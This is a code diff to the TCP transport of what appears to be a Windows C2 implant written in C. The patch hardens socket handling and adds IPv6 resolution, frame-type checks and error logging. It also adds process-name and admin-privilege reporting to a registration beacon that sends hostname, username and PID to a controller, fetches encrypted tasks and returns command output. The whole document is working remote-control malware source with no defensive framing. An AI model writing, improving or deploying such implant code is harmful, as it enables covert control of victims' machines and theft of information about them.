@@ -4,6 +4,7 @@
 #include "crypto.h"
 #include "b64.h"
 #include <winsock2.h>
+#include <ws2tcpip.h>
 #include <windows.h>
 #include <mstcpip.h>
 #include <stdlib.h>
@@ -17,8 +18,37 @@
 
 // Persistent TCP socket (opened during register, reused for beacon/result).
 static SOCKET g_tcp_sock = INVALID_SOCKET;
+static volatile LONG g_wsa_state = 0; /* 0=uninitialised, 1=starting, 2=ready, -1=failed */
 
 #define TCP_MAX_FRAME (32u * 1024u * 1024u)
+
+static char* tcp_json_escape(const char *s);
+
+static void tcp_debug_error(const char *operation, int error_code) {
+    char msg[256];
+    snprintf(msg, sizeof(msg), "[agent-c][tcp] %s failed (winsock=%d)\n",
+             operation, error_code);
+    OutputDebugStringA(msg);
+}
+
+static int tcp_ensure_wsa(void) {
+    LONG state = InterlockedCompareExchange(&g_wsa_state, 1, 0);
+    if (state == 0) {
+        WSADATA wsd;
+        int rc = WSAStartup(MAKEWORD(2, 2), &wsd);
+        InterlockedExchange(&g_wsa_state, rc == 0 ? 2 : -1);
+        if (rc != 0) {
+            tcp_debug_error("WSAStartup", rc);
+            return 0;
+        }
+        return 1;
+    }
+    while (state == 1) {
+        Sleep(1);
+        state = InterlockedCompareExchange(&g_wsa_state, 0, 0);
+    }
+    return state == 2;
+}
 
 static void tcp_reset(void) {
     if (g_tcp_sock != INVALID_SOCKET) {
@@ -63,7 +93,14 @@ static int tcp_send_all(SOCKET s, const uint8_t *data, size_t len) {
     size_t sent = 0;
     while (sent < len) {
         int n = send(s, (const char *)data + sent, (int)(len - sent), 0);
-        if (n <= 0) return 0;
+        if (n < 0) {
+            tcp_debug_error("send", WSAGetLastError());
+            return 0;
+        }
+        if (n == 0) {
+            tcp_debug_error("send returned zero", WSAENOTCONN);
+            return 0;
+        }
         sent += (size_t)n;
     }
     return 1;
@@ -73,6 +110,7 @@ static int tcp_send_all(SOCKET s, const uint8_t *data, size_t len) {
 
 // Write 4-byte LE length prefix + data.
 static int tcp_write_msg(SOCKET s, const uint8_t *data, size_t len) {
+    if (!data || len == 0 || len > TCP_MAX_FRAME) return 0;
     uint8_t hdr[4];
     hdr[0]=(uint8_t)(len&0xff);
     hdr[1]=(uint8_t)((len>>8)&0xff);
@@ -88,7 +126,14 @@ static uint8_t* tcp_read_msg(SOCKET s, size_t *out_len) {
     uint8_t hdr[4]; int got=0;
     while (got<4) {
         int r=recv(s,(char*)hdr+got,4-got,0);
-        if (r<=0) return NULL;
+        if (r < 0) {
+            tcp_debug_error("recv frame header", WSAGetLastError());
+            return NULL;
+        }
+        if (r == 0) {
+            tcp_debug_error("peer closed while reading frame header", 0);
+            return NULL;
+        }
         got+=r;
     }
     size_t len=(size_t)hdr[0]|((size_t)hdr[1]<<8)|
@@ -99,7 +144,16 @@ static uint8_t* tcp_read_msg(SOCKET s, size_t *out_len) {
     size_t total=0;
     while (total<len) {
         int r=recv(s,(char*)buf+total,(int)(len-total),0);
-        if (r<=0) { free(buf); return NULL; }
+        if (r < 0) {
+            tcp_debug_error("recv frame body", WSAGetLastError());
+            free(buf);
+            return NULL;
+        }
+        if (r == 0) {
+            tcp_debug_error("peer closed while reading frame body", 0);
+            free(buf);
+            return NULL;
+        }
         total+=r;
     }
     buf[len]='\0';
@@ -130,6 +184,17 @@ static char* tcp_recv_raw(void) {
     return s;
 }
 
+static int tcp_recv_ack(void) {
+    char *ack = tcp_recv_raw();
+    if (!ack) return 0;
+    char type[16] = {0};
+    int ok = agent_json_str(ack, "t", type, sizeof(type)) &&
+             strcmp(type, "ack") == 0;
+    if (!ok) tcp_debug_error("unexpected TCP ACK type", 0);
+    free(ack);
+    return ok;
+}
+
 // ── Send AES-GCM encrypted envelope {"t":"<type>","p":"<b64_ciphertext>"} ───
 static int tcp_send_enc(const char *msg_type, const char *payload_json) {
     size_t enc_len=0;
@@ -149,11 +214,19 @@ static int tcp_send_enc(const char *msg_type, const char *payload_json) {
     return ok;
 }
 
-// ── Receive AES-GCM encrypted envelope, decrypt, return plain JSON. Caller free().
-static char* tcp_recv_enc(void) {
+// ── Receive an AES-GCM envelope of the expected type and decrypt it.
+// Caller owns the returned plaintext.
+static char* tcp_recv_enc(const char *expected_type) {
     size_t resp_len=0;
     uint8_t *resp = tcp_read_msg(g_tcp_sock, &resp_len);
     if (!resp) return NULL;
+    char type[32] = {0};
+    if (!agent_json_str((char*)resp, "t", type, sizeof(type)) ||
+        !expected_type || strcmp(type, expected_type) != 0) {
+        tcp_debug_error("unexpected TCP response type", 0);
+        free(resp);
+        return NULL;
+    }
     char *b64 = agent_json_str_alloc((char*)resp, "p");
     free(resp);
     if (!b64) return NULL;
@@ -170,36 +243,71 @@ static char* tcp_recv_enc(void) {
 // ── TCP connect ───────────────────────────────────────────────────────────────
 
 static SOCKET tcp_connect(void) {
-    // Parse host:port from AGENT_SERVER_URL ("tcp://host:port" or "host:port")
+    // Parse host:port from AGENT_SERVER_URL ("tcp://host:port" or "host:port").
     const char *url = AGENT_SERVER_URL;
     if (strncmp(url, "tcp://", 6) == 0) url += 6;
     char host[256]={0}; int port = 8080;
-    const char *colon = strrchr(url, ':');
-    if (colon) {
-        size_t hl = (size_t)(colon - url);
-        if (hl < sizeof(host)) { memcpy(host, url, hl); host[hl]='\0'; }
-        port = atoi(colon + 1);
+    if (*url == '[') {
+        const char *end = strchr(url, ']');
+        if (!end || (end[1] && end[1] != ':')) {
+            tcp_debug_error("invalid bracketed TCP endpoint", 0);
+            return INVALID_SOCKET;
+        }
+        size_t hl = (size_t)(end - url - 1);
+        if (hl == 0 || hl >= sizeof(host)) {
+            tcp_debug_error("invalid TCP host", 0);
+            return INVALID_SOCKET;
+        }
+        memcpy(host, url + 1, hl);
+        host[hl] = '\0';
+        if (end[1] == ':') port = atoi(end + 2);
     } else {
-        strncpy(host, url, sizeof(host)-1);
+        const char *colon = strrchr(url, ':');
+        if (colon && strchr(url, ':') == colon) {
+            size_t hl = (size_t)(colon - url);
+            if (hl == 0 || hl >= sizeof(host)) {
+                tcp_debug_error("invalid TCP host", 0);
+                return INVALID_SOCKET;
+            }
+            memcpy(host, url, hl);
+            host[hl]='\0';
+            port = atoi(colon + 1);
+        } else {
+            strncpy(host, url, sizeof(host)-1);
+        }
     }
-
-    WSADATA wsd; WSAStartup(MAKEWORD(2,2), &wsd);
-
-    SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
-    if (s == INVALID_SOCKET) return INVALID_SOCKET;
-
-    struct sockaddr_in dst = {0};
-    dst.sin_family = AF_INET;
-    dst.sin_port   = htons((u_short)port);
-    dst.sin_addr.s_addr = inet_addr(host);
-
-    tcp_configure_socket(s);
-
-    if (connect(s, (struct sockaddr*)&dst, sizeof(dst)) != 0) {
-        closesocket(s);
+    if (!host[0] || port < 1 || port > 65535) {
+        tcp_debug_error("invalid TCP endpoint", 0);
         return INVALID_SOCKET;
     }
-    return s;
+
+    if (!tcp_ensure_wsa()) return INVALID_SOCKET;
+
+    char port_text[8];
+    snprintf(port_text, sizeof(port_text), "%d", port);
+    struct addrinfo hints = {0}, *results = NULL;
+    hints.ai_socktype = SOCK_STREAM;
+    hints.ai_protocol = IPPROTO_TCP;
+    int gai_rc = getaddrinfo(host, port_text, &hints, &results);
+    if (gai_rc != 0) {
+        tcp_debug_error("getaddrinfo", gai_rc);
+        return INVALID_SOCKET;
+    }
+
+    SOCKET connected = INVALID_SOCKET;
+    for (struct addrinfo *it = results; it; it = it->ai_next) {
+        SOCKET s = socket(it->ai_family, it->ai_socktype, it->ai_protocol);
+        if (s == INVALID_SOCKET) continue;
+        tcp_configure_socket(s);
+        if (connect(s, it->ai_addr, (int)it->ai_addrlen) == 0) {
+            connected = s;
+            break;
+        }
+        tcp_debug_error("connect", WSAGetLastError());
+        closesocket(s);
+    }
+    freeaddrinfo(results);
+    return connected;
 }
 
 /* Escape command output before embedding it in the encrypted result JSON.
@@ -239,6 +347,49 @@ static char* tcp_json_escape(const char *s) {
     return out;
 }
 
+static void tcp_get_process_name(char *out, size_t out_sz) {
+    if (!out || out_sz == 0) return;
+    strncpy(out, "agent.exe", out_sz - 1);
+    out[out_sz - 1] = '\0';
+    DWORD n = GetModuleFileNameA(NULL, out, (DWORD)out_sz);
+    if (n == 0 || n >= out_sz) {
+        strncpy(out, "agent.exe", out_sz - 1);
+        out[out_sz - 1] = '\0';
+        return;
+    }
+    char *slash = strrchr(out, '\\');
+    if (slash) memmove(out, slash + 1, strlen(slash + 1) + 1);
+}
+
+static int tcp_is_elevated(void) {
+    HANDLE token = NULL;
+    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &token)) return 0;
+
+    TOKEN_ELEVATION elevation = {0};
+    DWORD size = sizeof(elevation);
+    if (GetTokenInformation(token, TokenElevation, &elevation,
+                            sizeof(elevation), &size) && elevation.TokenIsElevated) {
+        CloseHandle(token);
+        return 1;
+    }
+
+    HANDLE linked = NULL;
+    size = sizeof(linked);
+    if (GetTokenInformation(token, TokenLinkedToken, &linked,
+                            sizeof(linked), &size) && linked) {
+        ZeroMemory(&elevation, sizeof(elevation));
+        size = sizeof(elevation);
+        BOOL elevated = GetTokenInformation(linked, TokenElevation, &elevation,
+                                            sizeof(elevation), &size) &&
+                        elevation.TokenIsElevated;
+        CloseHandle(linked);
+        CloseHandle(token);
+        return elevated ? 1 : 0;
+    }
+    CloseHandle(token);
+    return 0;
+}
+
 // ── Transport operations ──────────────────────────────────────────────────────
 
 int transport_tcp_register(void) {
@@ -247,26 +398,47 @@ int transport_tcp_register(void) {
     if (g_tcp_sock == INVALID_SOCKET) return 0;
 
     char hostname[128]="UNKNOWN", username[256]="UNKNOWN";
+    char process_name[MAX_PATH]="agent.exe";
     DWORD hsz=sizeof(hostname);
     GetComputerNameA(hostname, &hsz);
     for (DWORD i = 0; i < hsz; i++) hostname[i] = (char)tolower((unsigned char)hostname[i]);
     ULONG usz=sizeof(username);
     if (!GetUserNameExA(2 /*NameSamCompatible*/, username, &usz))
         GetUserNameA(username, (DWORD*)&usz);
-    char username_j[512]={0};
-    for (int _i=0,_j=0; username[_i]&&_j<(int)sizeof(username_j)-2; _i++) {
-        if (username[_i]=='\\') username_j[_j++]='\\';
-        username_j[_j++]=username[_i];
+    tcp_get_process_name(process_name, sizeof(process_name));
+
+    char *hostname_j = tcp_json_escape(hostname);
+    char *username_json = tcp_json_escape(username);
+    char *process_json = tcp_json_escape(process_name);
+    char *parent_json = tcp_json_escape(AGENT_PARENT_ID);
+    if (!hostname_j || !username_json || !process_json || !parent_json) {
+        free(hostname_j);
+        free(username_json);
+        free(process_json);
+        free(parent_json);
+        tcp_reset();
+        return 0;
     }
 
     // Registration is plaintext — AES key not yet known
-    char body[1024];
-    snprintf(body, sizeof(body),
+    char body[2048];
+    int body_len = snprintf(body, sizeof(body),
         "{\"hostname\":\"%s\",\"username\":\"%s\",\"os\":\"windows/amd64\","
         "\"pid\":%lu,\"transport\":\"tcp\","
-        "\"sleep_sec\":%d,\"jitter_pct\":%d,\"parent_id\":\"%s\",\"language\":\"c\"}",
-        hostname, username_j, (unsigned long)GetCurrentProcessId(),
-        AGENT_SLEEP_SEC, AGENT_JITTER_PCT, AGENT_PARENT_ID);
+        "\"sleep_sec\":%d,\"jitter_pct\":%d,\"process_name\":\"%s\","
+        "\"is_admin\":%s,\"parent_id\":\"%s\",\"language\":\"c\"}",
+        hostname_j, username_json, (unsigned long)GetCurrentProcessId(),
+        AGENT_SLEEP_SEC, AGENT_JITTER_PCT, process_json,
+        tcp_is_elevated() ? "true" : "false", parent_json);
+    free(hostname_j);
+    free(username_json);
+    free(process_json);
+    free(parent_json);
+    if (body_len < 0 || (size_t)body_len >= sizeof(body)) {
+        tcp_debug_error("registration body too large", 0);
+        tcp_reset();
+        return 0;
+    }
 
     if (!tcp_send_register(body)) {
         tcp_reset();
@@ -280,6 +452,14 @@ int transport_tcp_register(void) {
         return 0;
     }
 
+    char response_type[32]={0};
+    if (!agent_json_str(resp_raw, "t", response_type, sizeof(response_type)) ||
+        strcmp(response_type, "register_resp") != 0) {
+        tcp_debug_error("unexpected registration response type", 0);
+        free(resp_raw);
+        tcp_reset();
+        return 0;
+    }
     char agent_id[64]={0}, aes_key_b64[128]={0};
     agent_json_str(resp_raw, "agent_id", agent_id, sizeof(agent_id));
     agent_json_str(resp_raw, "aes_key",  aes_key_b64, sizeof(aes_key_b64));
@@ -314,7 +494,7 @@ AgentTask* transport_tcp_beacon(int *count) {
         return NULL;
     }
 
-    char *resp_plain = tcp_recv_enc();
+    char *resp_plain = tcp_recv_enc("tasks");
     if (!resp_plain) {
         tcp_reset();
         return NULL;
@@ -360,8 +540,6 @@ void transport_tcp_send_result(long long task_id, const char *output,
     }
     free(body);
 
-    // Drain plaintext ACK {"t":"ack"} — no encrypted payload
-    char *ack = tcp_recv_raw();
-    if (!ack) tcp_reset();
-    free(ack);
+    // Drain plaintext ACK {"t":"ack"} — no encrypted payload.
+    if (!tcp_recv_ack()) tcp_reset();
 }
